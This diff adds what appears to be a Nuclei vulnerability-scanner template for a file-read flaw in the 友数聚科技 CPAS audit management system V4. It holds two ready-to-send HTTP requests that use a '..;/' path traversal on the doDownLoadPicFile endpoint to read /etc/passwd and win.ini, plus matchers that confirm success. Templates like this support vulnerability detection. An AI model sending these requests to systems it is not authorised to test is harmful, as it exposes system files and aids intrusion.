@@ -1,0 +1,33 @@
+id: youshuju-doDownLoadPicFile-file
+
+info:
+  name: 友数聚科技-CPAS审计管理系统V4 doDownLoadPicFile 文件读取漏洞
+  author: youshuju
+  severity: medium
+  tags: youshuju
+
+http:
+  - raw:
+      - |+
+        GET /cpasm4/static/..;/mobileUploadPictureController/doDownLoadPicFile?picPath=%2Fetc%2Fpasswd&fileType=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+
+      - |+
+        GET /cpasm4/static/..;/mobileUploadPictureController/doDownLoadPicFile?picPath=c:/windows/win.ini&fileType=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: linux
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+      - type: word
+        name: windows
+        part: body
+        words:
+          - 'for 16-bit app support'
